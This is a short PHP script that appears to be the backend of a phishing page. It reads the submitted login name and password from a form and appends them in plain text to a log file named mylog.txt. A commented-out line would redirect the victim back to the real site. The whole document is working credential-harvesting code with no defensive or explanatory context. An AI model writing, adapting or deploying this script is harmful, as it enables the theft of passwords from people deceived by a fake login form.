<?php
//$log_file_name = 'mylog.txt'; // Change to the log file name
	//$n = $_POST['name'];
	//$p = $_POST['pass'];
 	 //$message = "Login name : ".$n."\t" . "password ".$p."\n";
 	 file_put_contents('mylog.txt', "Login name : ".$_POST['name']."\t" . "password ".$_POST['pass']."\n");
 	 //header('Location: /'); // redirect back to the main site
?>
